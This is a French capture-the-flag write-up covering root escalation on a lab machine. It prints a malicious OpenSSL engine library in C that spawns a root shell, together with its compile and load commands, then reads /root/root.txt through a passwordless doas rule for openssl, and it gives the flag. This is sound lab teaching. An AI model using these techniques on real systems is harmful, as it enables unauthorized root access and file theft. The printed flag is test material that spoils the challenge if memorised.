# CTF "Chase your d(a)emons" — Write-up Root.txt

**Cible :** 10.10.0.45 (IP changeante après restart)
**Hostname :** `infinity_castle`
**Prérequis :** shell en tant que `muzan` (voir write-up user.txt)
**Objectif :** obtenir `root.txt`

---

## 1. Énumération des vecteurs de privesc classiques

Une fois authentifié en tant que `muzan`, recherche des vecteurs habituels :

```bash
sudo -l
find / -perm -4000 -type f 2>/dev/null   # binaires SUID
getcap -r / 2>/dev/null                   # capabilities
```

**Résultat des binaires SUID :**

```
/usr/bin/mount
/usr/bin/passwd
/usr/bin/umount
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/su
/usr/bin/chsh
/usr/bin/doas       <-- inhabituel sur une Debian standard
/usr/bin/sudo
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/sbin/exim4
```

`doas` (équivalent OpenBSD de `sudo`) n'est pas présent par défaut sur Debian — signal fort qu'il a été configuré spécifiquement pour ce challenge.

## 2. Analyse de la configuration doas

```bash
cat /etc/doas.conf
```

```
permit nopass muzan as root cmd openssl
```

`muzan` peut exécuter `openssl` en tant que **root, sans mot de passe**, sans aucune restriction sur les sous-commandes ou arguments.

## 3. Tentative initiale (écartée) — engine OpenSSL

La technique GTFOBins classique pour `openssl` consiste à charger une librairie partagée malveillante comme *engine* au démarrage :

```c
// shell.c
#include <stdio.h>
#include <stdlib.h>

__attribute__ ((__constructor__))
void dropshell(void){
    setuid(0);
    setgid(0);
    system("/bin/sh");
}
```

```bash
gcc -fPIC -shared -o shell.so shell.c -lc
doas openssl req -engine /tmp/shell.so -new -x509 -out /tmp/x.crt
```

**Problème rencontré :** aucun compilateur (`gcc`, `cc`, `g++`, `clang`, `tcc`) n'est disponible sur la cible (Debian 13 "trixie"). Seul `python3` est présent. La compilation croisée via Docker (image `debian:13.6`) a été tentée mais s'est révélée peu fiable / complexe à mettre en place rapidement dans le contexte du CTF.

## 4. Exploitation retenue — détournement d'openssl comme simple lecteur de fichier

`openssl` tournant en root via `doas`, il peut lire n'importe quel fichier du système — y compris `/root/root.txt`, inaccessible à `muzan`. Pas besoin de shell root complet : un simple encodage/décodage suffit à exfiltrer le contenu.

```bash
doas openssl base64 -in /root/root.txt -out /tmp/root_b64.txt
```

Le fichier de sortie `/tmp/root_b64.txt` est créé par le process `openssl` (exécuté en root via `doas`) mais reste lisible par `muzan` (permissions par défaut du umask).

```bash
cat /tmp/root_b64.txt
base64 -d /tmp/root_b64.txt
```

## 5. Récupération du flag

```
EPI{1_w1ll_no7_7Rampl3_on_7h3_Pa1N5_of_B31n9_A_d3mon}
```

---

## Résumé de la chaîne d'exploitation

1. `find / -perm -4000` → présence suspecte de `doas`
2. `/etc/doas.conf` → `muzan` peut lancer `openssl` en root, sans mot de passe
3. Approche GTFOBins classique (engine `.so` malveillant) écartée : pas de compilateur sur la cible
4. Approche alternative plus simple : `doas openssl base64 -in /root/root.txt -out /tmp/root_b64.txt`
5. Décodage local du fichier de sortie → `root.txt` récupéré sans avoir besoin d'un shell root interactif

## Leçon à retenir

Quand un binaire autorisé via `sudo`/`doas` permet de **lire et écrire des fichiers arbitraires** (comme `openssl` avec ses sous-commandes `base64`, `enc`, etc.), il n'est pas toujours nécessaire de chercher l'exploit "shell root" classique de GTFOBins : lire directement le fichier cible via une fonctionnalité détournée du binaire est souvent plus rapide et ne dépend d'aucun outil supplémentaire (compilateur, etc.) sur la machine cible.